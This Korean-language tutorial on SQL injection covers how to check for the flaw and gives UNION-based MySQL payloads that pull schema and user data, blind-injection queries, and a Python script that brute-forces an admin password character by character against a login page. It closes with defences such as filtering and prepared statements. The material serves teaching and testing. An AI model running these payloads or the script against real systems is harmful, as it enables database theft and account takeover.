# 1. 취약점 정의

사용자의 입력 값이 서버의 쿼리문에서 사용되는 경우 공격자가 입력 값으로 SQL 쿼리문을 주입하여 개발자가 의도하지 않는 방향으로 쿼리문이 실행되도록 하는 취약점

# 2. 취약점 점검 방법

먼저 SQL Injection 취약점 발생 가능성이 존재할 것으로 보이는 기능을 식별한다. 서버의 DB와 연동되어 있을 것 같은 기능을 찾으면 되는데, 주로 로그인, 데이터 검색, 비밀번호 변경 등의 기능이 있다.

우선 SQL 문법에 영향을 줄 수 있는 특수문자(', ", \, ;, -- 등)를 입력해보며 반응을 살펴본다. 만약 SQL 문법에 에러가 발생하여 에러 메시지가 그대로 사용자 측 브라우저에 출력되면 SQL Injection이 발생할 가능성이 있는 것이다. 그리고 직접적으로 에러 메시지가 출력되지 않더라고 500 에러가 발생하거나 응답 페이지 내용 일부의 변화가 있다면 마찬가지로 SQL Injection이 발생할 가능성이 있다고 생각해볼 수 있다. 

추가로 여러 쿼리문을 입력해보았을 때 조회되는 데이터의 차이가 있다면 Blind SQL Injection 취약점의 발생 가능성을 생각해볼 수 있다. Blind SQL Injection은 서버에서 실행되는 SQL 쿼리문에 따라 가변하는 응답 값의 차이로 DB 내부 데이터를 유출하는 기법이다.

## 2.1. SQL Injection Payload

### UNION SQL Injection (MySQL)

```SQL
' order by 1-- 
' order by 2--
' order by 3-- 
' union select 1,2--
' union select 1,2,3--  
```

UNION SQL Injection 취약점이 존재한다면 먼저 ' order by 1-- 쿼리문을 주입하여 컬럼의 갯수를 알아내야 한다. union select는 select문에서 조회하는 컬럼 갯수와 일치하는 경우에만 실행되기 때문이다. 만약 ' order by 3-- 쿼리문을 실행할 때 에러가 발생한다면, 해당 기능에서 사용하는 테이블은 3개 이하의 컬럼을 가지고 있는 것이다. 그리고 union select 문을 주입하는데, 컬럼 갯수에 맞게 임의의 값을 입력하여 union select 문이 실행되도록 한다. 이제 실제로 다음과 같은 쿼리문을 주입하면 다른 정보를 유출시킬 수 있다.

```SQL
' union select 1,2,database();-- 현재 사용중인 데이터베이스 이름
' union select 1,2,vesrsion();-- 현재 사용중인 데이터베이스 버전
' union select 1,2,user();-- 현재 로그인된 계정
' union select 1,2,table_name from information_schema.tables;-- information_schema.tables 는 DBMS가 자체적으로 보유하고 있는 메인 데이터베이스/스키마이다. DB 종류, 테이블 목록, 컬럼 구조, 접근 권한 등의 관리용 정보가 여기에 담겨있다. 그리고 .tables는 information_schema 안에 들어있는 시스템 뷰(View) 이름으로, 해당 DB에 구축되어 있는 모든 테이블에 대한 명세 정보가 저장되어있다.
' union select column_name from information_schema.columns WHERE table_name = '[TABLE_NAME]';-- 
```

## 2.2. Blind SQL Injection

쿼리문의 질의 실행 결과가 에러 메시지나 에러 코드 확인 등의 방법으로 확인되지 않으나 주입된 쿼리문이 실행된 결과가 참일 때와 거짓일 때의 사용자 측에 출력되는 결괏값이 가변된다고 판단되는 경우 발생할 가능성이 있다고 볼 수 있다. 위에서 살펴보았던 쿼리문처럼 조회하는 쿼리문을 직접적으로 주입하는 것이 아니라 조회된 결괏값의 일부와 특정 문자(예를 들면 알파벳이나 특수문자 등)를 비교하는 쿼리문을 주입하여 한 글자씩 알아내는 방법이 일반적이다.

... 요약하면 그냥 질의 결과를 사용자가 화면에서 직접 확인하지 못할 때 참/거짓 반환 결과로 데이터를 획득하는 기법을 Blind SQL Injection 이라고 한다.

### Blind SQL Injection

```SQL
# 첫 번째 글자 알아내기
select * from user_table where uid='admin' and substr(upw,1,1)='a'--
# admin 부터 사용자의 입력 값이며, substr 함수를 사용하여 user_table 테이블에서 uid가 admin 이고 upw의 첫 글자가 'a' 인지 확인한다. 실행 결과가 참이라면 'a'인 것이고, 거짓이라면 'a'가 아니다.

# 두 번째 글자 알아내기
select * from user_table where uid='admin' and substr(upw,2,1)='a'--
# substr 함수 인자 중 두 번째 인자를 2로 변경하여 두 번째 글자를 알아낸다.
```

### Blind SQL Injection 테스트 코드 작성

Blind SQL Injection은 한 글자를 여러 개의 문자와 비교하여 원하는 데이터를 알아내는 방식이기 때문에, 자동화 스크립트를 작성하거나 Burp Suite의 Intruder를 사용한다. 아래의 코드는 Blind SQL Injection을 시도하기 위한 일반적인 코드이다.

```python
#!/usr/bin/python3
import requests
import string
# example URL
url = 'http://example.com/login'
params = {
    'uid': '',
    'upw': ''
}
# ascii printables
tc = string.printable
# 사용할 SQL Injection 쿼리
query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
password = ''
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find("Login success") != -1:
            password += ch
            break
print(f"Password is {password}")
```
SQL Injection 및 기타 다양한 취약점의 payload 정보

- https://github.com/swisskyrepo/PayloadsAllTheThings

# 3. 대응방안

## 3.1. 입력 값 필터링

파라미터 입력 값 중 SQL Injection을 발생시킬 수 있는 ',",`,- 등의 특수문자를 필터링한다. 그리고 union, select, substr, sleep 등 SQL Injection에 사용되는 키워드도 같이 필터링하면 더 좋다.

특수문자와 키워드 둘 다 필터링하는 것이 좋고, 서비스의 원활한 운영을 위해 둘 중 하나만 적용하는 것도 고려할 수 있다.

## 3.2. PreparedStatement 적용

SQL Injection을 방어하기 위해 존재하는 기능은 아니지만 그 기능의 특성 덕분에 SQL Injection을 방어할 수 있다. PreparedStatement는 서버에서 실행될 쿼리문에 바인딩 문자(?)를 입력하고, 쿼리문이 실행될 때 이 바인딩 문자에 사용자 입력 값을 바인딩한다. 그러면 쿼리문에 포함되는 사용자의 입력 값은 컬럼명이나 명령어 등의 쿼리문의 일부로 인식되는 것이 아니라 일반적인 문자열로 인식되기 때문에 악의적인 쿼리문을 주입하여도 쿼리문이 실행되지 않는다.

## 3.3. ORM 적용

다만, ORM도 공격 가능한 사례가 존재하므로 100퍼센트 방어할 수는 없다.

- 참고 사례 : https://www.skshieldus.com/report/eqstInsight/rt2604.html (ORM Injection)

# 4. 참고

- https://www.skshieldus.com/report/eqstInsight/rt2604.html
